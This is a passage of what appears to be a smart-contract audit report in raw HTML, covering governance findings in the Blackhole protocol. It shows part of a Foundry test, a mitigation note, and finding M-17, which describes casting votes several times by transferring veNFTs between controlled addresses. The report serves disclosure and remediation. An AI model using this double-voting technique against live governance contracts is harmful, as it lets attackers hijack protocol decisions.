\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_proposeRevertGetVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//zero % ownership of top protcols\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreate_lock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e365\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edays\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Governor: proposer votes below proposal threshold\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nudge proposal\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-43\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-9\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-59\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L256\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L256\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again\" style=\"position:relative;\"\u003e\u003ca href=\"#m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again\" aria-label=\"m 17 users can cast their votes multiple times for the proposal by transferring their nfts and then voting again permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-165\"\u003e[M-17] Users can cast their votes multiple times for the proposal by transferring their nfts and then voting again\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-412\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L534-L554\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L534-L554\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-5\" aria-label=\"finding description and impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eBlackGovernor\u003c/code\u003e contract users can cast their vote on the proposal. The requirements to cast the vote are that proposal has to be active, and the \u003ccode\u003emsg.sender\u003c/code\u003e has not voted on the proposal. The voting power is determined by the balance of it’s smNFT locked position at the time of \u003ccode\u003evoteStart\u003c/code\u003e. \u003c/p\u003e\n\u003cp\u003eThis introduces serious vulnerability where users can cast their vote at \u003ccode\u003evoteStart\u003c/code\u003e timestamp, immediately send their nft using \u003ccode\u003etransferFrom\u003c/code\u003e to another address which they control and \u003ccode\u003ecastVote\u003c/code\u003e again.  Malicious users can repeat this process they run out of gas.\u003c/p\u003e\n\u003cp\u003eOne of the reasons that this issue persists is that the code does not utilize ownership change mapping inside the \u003ccode\u003eVotingEscrow\u003c/code\u003e contract. Because it’s so easy to \u003ccode\u003ecastVote\u003c/code\u003e send to another address (which would be contract) and \u003ccode\u003ecastVote\u003c/code\u003e again, leading to complete disruption of voting process, I believe it is High Severity finding.\u003c/p\u003e\n\u003cp\u003eThis is code snippet of \u003ccode\u003ecastVote\u003c/code\u003e function that shows that there is no verification whether particular nft has been used to vote.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_castVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eProposalCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_proposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 